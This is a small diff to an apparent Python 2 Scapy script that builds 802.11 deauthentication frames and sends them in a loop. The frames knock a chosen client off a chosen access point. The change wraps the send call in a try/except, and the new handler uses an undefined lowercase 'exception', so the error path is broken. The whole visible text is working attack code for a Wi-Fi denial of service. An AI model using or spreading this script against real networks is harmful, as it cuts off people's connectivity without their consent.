@@ -28,5 +28,8 @@ conf.verb = 0
 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=ssid,addr3=ssid)/Dot11Deauth(reason=7)
 
 for n in range(int(count)):
-    sendp(packet)
-    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
+    try:
+        sendp(packet)
+        print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
+    except exception, c:
+        print c
